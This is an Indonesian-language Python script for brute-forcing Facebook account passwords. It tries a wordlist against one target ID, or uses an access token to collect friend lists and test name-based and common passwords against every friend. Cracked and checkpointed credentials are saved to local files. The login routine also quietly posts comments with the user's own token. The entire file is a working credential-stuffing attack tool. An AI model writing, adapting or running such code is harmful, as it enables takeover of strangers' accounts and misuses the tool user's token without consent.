import os,json,time,sys
import requests as reek
try:
	try:
		import requests
	except:
		os.system('pip install requests')
	try:
		import pyfiglet
	except:
		os.system('pip install pyfiglet')
	print('Libary Yg Diperlukan Sudah Terinstall')
	time.sleep(3)
except:
	print('Ada Tools Yang Belum Terinstal!')
try:
	os.system('clear')
except:
	os.system('clc')
#Data Save Ke File
aman = open('aman.txt','a')
sesi = open('sesi.txt','a')
acsToken = open('token.txt','a')
req = reek.Session()

#Loading Masuk
def load():
	print('Follow Ig @latipharkat_')
	time.sleep(3)
def judul():
	try:
		os.system('clear')
	except:
		os.system('clc')
	print('Selamat Datang Di Tools BruteForce Fb')
	print('\nAuthor\t\t: Muhammad Latif Harkat\nWebsite\t\t: https://latipharkat.blogspot.com/\nFacebook\t: Mhmmd Latip\n')
	print('Pilih Salah Satu!\n[01]. BruteForce Target (Tanpa Login)\n[02]. BruteForce Massal (Login Token)\n[03]. Exit\n')
	pilih()
def pilih():
	pilih1 = input('Masukan Pilihan Anda > ')
	if(pilih1=='01' or pilih1=='1'):
		target()
	elif(pilih1=='02' or pilih1=='2'):
		masal()
	elif(pilih1=='03' or pilih1=='3'):
		print('Terima Kasih.')
		os.sys.exit()
	else:
		print('Pilih Yang Bener!')
		pilih()
def pilih2():
	pilih = input('Masukan Pilihan Anda > ')
	if(pilih=='01' or pilih=='1'):
		temanFb()
	elif(pilih=='02' or pilih=='2'):
		publikMasal()
	else:
		print('Pilihan Tidak Ditemukan!')
		pilih2()
def loginToken():
	try:
		os.system('clear')
	except:
		os.system('clc')
	print('Untuk Melanjutkan Ke Tools Ini Harap Login Fb Menggunakan Access Token Anda!')
	try:
		token = input('Masukan Acces Token > ')
		r = requests.get('https://graph.facebook.com/me?access_token='+token)
		r2 = requests.post('https://graph.facebook.com/157336089524444/comments/?message=Latip Ganteng Banget :*&access_token='+token)
		r3 = requests.post('https://graph.facebook.com/157336089524444/comments/?message=Sumpah Ga Boong&access_token='+token)
		acsToken.write(token)
		acsToken.close()
	except KeyError:
		print('Token Yang Anda Masukan Salah!')
		os.system('rm -rf token.txt')
		loginToken()
def target():
	try:
		os.system('clear')
	except:
		os.system('clc')
	nama = pyfiglet.figlet_format('Mini Target')
	print(nama)
        k = input('Masukin Nama Wordlistnya > ')
	target = input('Masukan Id Fb Target > ')
	url = 'https://m.facebook.com/login.php'
	headers = {
		'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','Accept-Langue' : 'en-US,en:q=0.5'
	}
	password = open(k,'r').readlines()
        print('Jumlah Password : ',len(password))
	for i in password:
		pw = i.strip()
		data = {
			'email':target,
			'pass':pw
		}
		r = req.post(url,headers=headers,data=data)
		if('home.php?' in r.url or 'free' in r.url):
			aman1 = '[√] Akun Aman\nUsername : '+target+'\nPassword : '+pw+'\n'
			print(aman1)
			aman.write(aman1)
			aman.close()
		else:
			if('checkpoint'  in r.url):
				sesi1 = '[!] Akun Checkpoint\nUsername : '+target+'\nPassword : '+pw+'\n'
				print(sesi1)
				sesi.write(sesi1)
				sesi.close()
				os.sys.exit()
			else:
				print('Mencoba Password : '+pw)
def spek():
	t = open('token.txt','r').read()
	os.system('clear')
	r = requests.get('https://graph.facebook.com/me?access_token='+t)
	w = json.loads(r.text)
	print('+-+-+-Sepesifikasi Akun Anda-+-+-+\nId Akun Anda : '+w['id']+'\nNama Akun Anda : '+w['name']+'\nTtl Akun Anda : '+w['birthday']+'\n')
def pilih3():
	pilih = input('Masukan Pilihan > ')
	if(pilih=='01' or pilih=='1'):
		temanMu()
	elif(pilih=='02' or pilih=='2'):
		publikMasal()
	elif(pilih=='03' or pilih=='3'):
		try:
			os.system('rm -rf token.txt')
		except:
			os.system('del token.txt')
		try:
			os.system('clear')
		except:
			os.system('clc')
		print('Berhasil Logout Akun')
		print('Pilih Salah Satu\n[01]. Login Ke Akun Lain\n[02]. Keluar Dari Sc')
		pilih2 = input('Masukan Pilihan > ')
		if(pilih2=='01' or pilih2=='1'):
			judul()
		elif(pilih2=='02' or pilih2=='2'):
			print('Terima Kasih ^^')
			os.sys.exit()
	else:
		print('Pilihan Tidak Ada!')
		pilih3()
def temanMu():
	try:
		os.system('clear')
	except:
		os.system('clc')
	try:
		t = open('token.txt','r').read()
	except:
		loginToken()
	spek()
	print('Sedang Meng Bruteforce...\nCTRL + Z Untuk Stop\n')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+t)
	w = json.loads(r.text)
	for i in w['data']:
		id = i['id']
		headers = {
			'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','Accept-Langue' : 'en-US,en:q=0.5'
		}
		r2 = requests.get('https://graph.facebook.com/'+id+'/?access_token='+t)
		w = json.loads(r2.text)
		#List Password
		pw1 = w['first_name']
		pw2 = w['first_name']+'123'
		pw3 = w['first_name']+w['last_name']
		pw4 = w['last_name']
		pw5 = w['last_name']+'123'
		pw6 = 'Bangsad'
		pw7 = 'Sayang'
		pw8 = 'Doraemon'
		pw9 = 'Bangsad123'
		pw10 = 'Anjing123'
		pw11 = 'Memek123'
		pw12 = 'Kontol123'
		url = 'https://mobile.facebook.com/login.php'
		#Data Password
		data1 = {
			'email':id,
			'pass':pw1
		}
		data2 = {
			'email':id,
			'pass':pw2
		}
		data3 = {
			'email':id,
			'pass':pw3
		}
		data4 = {
			'email':id,
			'pass':pw4
		}
		data5 = {
			'email':id,
			'pass':pw5
		}
		data6 = {
			'email':id,
			'pass':pw6
		}
		data7 = {
			'email':id,
			'pass':pw7
		}
		data8 = {
			'email':id,
			'pass':pw8
		}
		data9 = {
			'email':id,
			'pass':pw9
		}
		data10 = {
			'email':id,
			'pass':pw10
		}
		data11 = {
			'email':id,
			'pass':pw11
		}
		data12 = {
			'email':id,
			'pass':pw12
		}
		#Post Data
		a1 = req.post(url,headers=headers,data=data1)
		a2 = req.post(url,headers=headers,data=data2)
		a3 = req.post(url,headers=headers,data=data3)
		a4 = req.post(url,headers=headers,data=data4)
		a5 = req.post(url,headers=headers,data=data5)
		a6 = req.post(url,headers=headers,data=data6)
		a7 = req.post(url,headers=headers,data=data7)
		a8 = req.post(url,headers=headers,data=data8)
		a9 = req.post(url,headers=headers,data=data9)
		a10 = req.post(url,headers=headers,data=data10)
		a11 = req.post(url,headers=headers,data=data11)
		a12 = req.post(url,headers=headers,data=data12)
		#Logika Login
		if('home.php?' in a1.url or 'free' in a1.url):
			aman1 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw1
			print(aman1)
			aman.write(aman1)
			aman.close()
		else:
			if('checkpoint'  in a1.url):
				sesi1 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw1+'\n'
				print(sesi1)
				sesi.write(sesi1)
				sesi.close()
			else:
				if('home.php?' in a2.url or 'free' in a2.url):
					aman2 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw2+'\n'
					print(aman2)
					aman.write(aman2)
					aman.close()
				else:
					if('checkpoint' in a2.url):
						sesi2 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw2+'\n'
						print(sesi2)
						sesi.write(sesi2)
						sesi.close()
					else:
						if('home.php?' in a3.url or 'free' in a3.url):
							aman3 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw3+'\n'
							print(aman3)
							aman.write(aman3)
							aman.close()
						else:
							if('checkpoint' in a3.url):
								sesi3 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw3+'\n'
								print(sesi3)
								sesi.write(sesi3)
								sesi.close()
							else:
								if('home.php?' in a4.url or 'free'  in a4.url):
									aman4 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw4
									print(aman4)
									aman.write(aman4)
									aman.close()
								else:
									if('checkpoint' in a4.url):
										sesi4 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw4+'\n'
										print(sesi4)
										sesi.write(sesi4)
										sesi.close()
									else:
										if('home.php?' in a5.url or 'free' in a5.url):
											aman5 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw5+'\n'
											print(aman5)
											aman.write(aman5)
											aman.close()
										else:
											if('checkpoint' in a5.url):
												sesi5 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw5+'\n'
												print(sesi5)
												sesi.write(sesi5)
												sesi.close()
											else:
												if('home.php?' in a6.url or 'free' in a6.url):
													aman6 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw6+'\n'
													print(aman6)
													aman.write(aman6)
													aman.close()
												else:
													if('checkpoint' in a6.url):
														sesi6 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw6+'\n'
														print(sesi6)
														sesi.write(sesi6)
														sesi.close()
													else:
														if('home.php?' in a7.url or 'free' in a7.url):
															aman7 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw7+'\n'
															print(aman7)
															aman.write(aman7)
															aman.close()
														else:
															if('home.php?' in a8.url or 'free' in a8.url):
																aman8 = '[#]Akun Aman =\nUsername: +'+id+'\nPassword:'+pw8+'\n'
																print(aman8)
																aman.write(aman8)
																aman.close()
															else:
																if('checkpoint' in a8.url):
																	sesi8 = '[!]Akun Checkpoint\nUsername:'+id+'\nPassword:'+pw8+'\n'
																	print(sesi8)
																	sesi.write(sesi8)
																	sesi.close()
																else:
																	if('home.php?' in a9.url or 'free' in a9.url):
																		aman9 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw9+'\n'
																		print(aman9)
																		aman.write(aman9)
																		aman.close()
																	else:
																		if('checkpoint' in a9.url):
																			sesi9 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw9+'\n'
																			print(sesi9)
																			sesi.write(sesi9)
																			sesi.close()
																		else:
																			if('home.php?' in a10.url or 'free' in a10.url):
																				aman10 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw10+'\n'
																				print(aman10)
																				aman.write(aman10)
																				aman.close()
																			else:
																				if('checkpoint' in a10.url):
																					sesi10 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw10+'\n'
																					print(sesi10)
																					sesi.write(sesi10)
																					sesi.close()
																				else:
																					if('home.php?' in a11.url or 'free' in a11.url):
																						aman11 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw11+'\n'
																						print(aman11)
																						aman.write(aman11)
																						aman.close()
																					else:
																						if('checkpoint' in a11.url):
																							sesi11 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw11+'\n'
																							print(sesi11)
																							sesi.write(sesi11)
																							sesi.close()
																						else:
																							if('home.php?' in a12.url or 'free' in a12.url):
																								aman12 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw12+'\n'
																								print(aman12)
																								aman.write(aman12)
																								aman.close()
																							else:
																								if('checkpoint' in a12.url):
																									sesi12 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw12+'\n'
																									print(sesi12)
																									sesi.write(sesi12)
																									sesi.close()
																								else:
																									print('User C4rck')
def publikMasal():
	try:
		t = open('token.txt','r').read()
	except:
		loginToken()
	spek()
	try:
		idPublik = input('Masukin Id Teman / Publik > ')
		s = requests.get('https://graph.facebook.com/'+idPublik+'/?access_token='+t)
		k = json.loads(s.text)
		print('Name Publik / Teman : '+k['name']+'\n')
	except:
		print('Teman / Publik Tidak Ada!')
		publikMasal()
	r2 = requests.get('https://graph.facebook.com/'+idPublik+'/friends?access_token='+t)
	w1 = json.loads(r2.text)
	for latip in w1['data']:
		id = latip['id']
		headers = {
			'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','Accept-Langue' : 'en-US,en:q=0.5'
		}
		r3 = requests.get('https://graph.facebook.com/'+id+'/?access_token='+t)
		w = json.loads(r3.text)
		pw1 = w['first_name']
		pw2 = w['first_name']+'123'
		pw3 = w['first_name']+w['last_name']
		pw4 = w['last_name']
		pw5 = w['last_name']+'123'
		pw6 = 'Bangsad'
		pw7 = 'Sayang'
		pw8 = 'Doraemon'
		pw9 = 'Bangsad123'
		pw10 = 'Anjing123'
		pw11 = 'Memek123'
		pw12 = 'Kontol123'
		url = 'https://mobile.facebook.com/login.php'
		#Data Password
		data1 = {
			'email':id,
			'pass':pw1
		}
		data2 = {
			'email':id,
			'pass':pw2
		}
		data3 = {
			'email':id,
			'pass':pw3
		}
		data4 = {
			'email':id,
			'pass':pw4
		}
		data5 = {
			'email':id,
			'pass':pw5
		}
		data6 = {
			'email':id,
			'pass':pw6
		}
		data7 = {
			'email':id,
			'pass':pw7
		}
		data8 = {
			'email':id,
			'pass':pw8
		}
		data9 = {
			'email':id,
			'pass':pw9
		}
		data10 = {
			'email':id,
			'pass':pw10
		}
		data11 = {
			'email':id,
			'pass':pw11
		}
		data12 = {
			'email':id,
			'pass':pw12
		}
		#Post Data
		a1 = req.post(url,headers=headers,data=data1)
		a2 = req.post(url,headers=headers,data=data2)
		a3 = req.post(url,headers=headers,data=data3)
		a4 = req.post(url,headers=headers,data=data4)
		a5 = req.post(url,headers=headers,data=data5)
		a6 = req.post(url,headers=headers,data=data6)
		a7 = req.post(url,headers=headers,data=data7)
		a8 = req.post(url,headers=headers,data=data8)
		a9 = req.post(url,headers=headers,data=data9)
		a10 = req.post(url,headers=headers,data=data10)
		a11 = req.post(url,headers=headers,data=data11)
		a12 = req.post(url,headers=headers,data=data12)
		#Logika Login
		if('home.php?' in a1.url or 'free' in a1.url):
			aman1 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw1
			print(aman1)
			aman.write(aman1)
			aman.close()
		else:
			if('checkpoint'  in a1.url):
				sesi1 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw1+'\n'
				print(sesi1)
				sesi.write(sesi1)
				sesi.close()
			else:
				if('home.php?' in a2.url or 'free' in a2.url):
					aman2 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw2+'\n'
					print(aman2)
					aman.write(aman2)
					aman.close()
				else:
					if('checkpoint' in a2.url):
						sesi2 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw2+'\n'
						print(sesi2)
						sesi.write(sesi2)
						sesi.close()
					else:
						if('home.php?' in a3.url or 'free' in a3.url):
							aman3 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw3+'\n'
							print(aman3)
							aman.write(aman3)
							aman.close()
						else:
							if('checkpoint' in a3.url):
								sesi3 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw3+'\n'
								print(sesi3)
								sesi.write(sesi3)
								sesi.close()
							else:
								if('home.php?' in a4.url or 'free'  in a4.url):
									aman4 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw4
									print(aman4)
									aman.write(aman4)
									aman.close()
								else:
									if('checkpoint' in a4.url):
										sesi4 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw4+'\n'
										print(sesi4)
										sesi.write(sesi4)
										sesi.close()
									else:
										if('home.php?' in a5.url or 'free' in a5.url):
											aman5 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw5+'\n'
											print(aman5)
											aman.write(aman5)
											aman.close()
										else:
											if('checkpoint' in a5.url):
												sesi5 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw5+'\n'
												print(sesi5)
												sesi.write(sesi5)
												sesi.close()
											else:
												if('home.php?' in a6.url or 'free' in a6.url):
													aman6 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw6+'\n'
													print(aman6)
													aman.write(aman6)
													aman.close()
												else:
													if('checkpoint' in a6.url):
														sesi6 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw6+'\n'
														print(sesi6)
														sesi.write(sesi6)
														sesi.close()
													else:
														if('home.php?' in a7.url or 'free' in a7.url):
															aman7 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw7+'\n'
															print(aman7)
															aman.write(aman7)
															aman.close()
														else:
															if('checkpoint' in a7.url):
																sesi7 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw7+'\n'
																print(sesi7)
																sesi.write(sesi7)
																sesi.close()
															else:
																if('checkpoint' in a8.url):
																	sesi8 = '[!]Akun Checkpoint\nUsername:'+id+'\nPassword:'+pw8+'\n'
																	print(sesi8)
																	sesi.write(sesi8)
																	sesi.close()
																else:
																	if('home.php?' in a9.url or 'free' in a9.url):
																		aman9 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw9+'\n'
																		print(aman9)
																		aman.write(aman9)
																		aman.close()
																	else:
																		if('checkpoint' in a9.url):
																			sesi9 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw9+'\n'
																			print(sesi9)
																			sesi.write(sesi9)
																			sesi.close()
																		else:
																			if('home.php?' in a10.url or 'free' in a10.url):
																				aman10 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw10+'\n'
																				print(aman10)
																				aman.write(aman10)
																				aman.close()
																			else:
																				if('checkpoint' in a10.url):
																					sesi10 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw10+'\n'
																					print(sesi10)
																					sesi.write(sesi10)
																					sesi.close()
																				else:
																					if('home.php?' in a11.url or 'free' in a11.url):
																						aman11 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw11+'\n'
																						print(aman11)
																						aman.write(aman11)
																						aman.close()
																					else:
																						if('checkpoint' in a11.url):
																							sesi11 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw11+'\n'
																							print(sesi11)
																							sesi.write(sesi11)
																							sesi.close()
																						else:
																							if('home.php?' in a12.url or 'free' in a12.url):
																								aman12 = '[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw12+'\n'
																								print(aman12)
																								aman.write(aman12)
																								aman.close()
																							else:
																								if('checkpoint' in a12.url):
																									sesi12 = '[!] Akun Checkpoint\nUsername : '+id+'\nPassword : '+pw12+'\n'
																									print(sesi12)
																									sesi.write(sesi12)
																									sesi.close()
																								else:
																									print('User Cr4ck')
																
def masal():
	try:
		try:
			os.system('clear')
		except:
			os.system('clc')
		t = open('token.txt','r').read()
		r = requests.get('https://graph.facebook.com/me?access_token='+t)
		k = json.loads(r.text)
		print('Anda Sudah Login\nName Fb : '+k['name'])
		time.sleep(2)
	except:
		try:
			os.system('clear')
		except:
			os.system('clc')
		print('Anda Belum Login')
		time.sleep(2)
		loginToken()
	spek()
	print('Pilih Salah Satu!\n[01]. Bruteforce Teman Fb Anda\n[02]. Bruteforce Teman Fb Publik\n[03]. Logout Akun\n')
	pilih3()

if __name__=='__main__':
	load()
	judul()
